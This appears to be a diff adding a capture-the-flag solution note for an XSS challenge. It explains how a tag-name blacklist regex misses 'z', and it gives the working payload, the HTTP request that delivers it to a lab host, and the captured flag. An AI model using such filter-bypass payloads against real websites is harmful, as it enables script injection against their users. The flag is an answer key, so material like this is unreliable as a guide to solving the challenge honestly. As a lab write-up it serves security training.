@@ -1,0 +1,4 @@
+# XSS via Blacklist Bypass - The filter regex r'<[a-yA-Y/]+' blocks tags starting with a-y but allows 'z'. Payload: <z onfocus=alert('XSS') autofocus tabindex=0> triggers XSS and returns flag{9541cc02-59a2-4171-8d30-5530ec31d825}
+
+GET /page?name=<z onfocus=alert('XSS') autofocus tabindex=0> HTTP/1.1
+Host: 172.17.0.1:53491
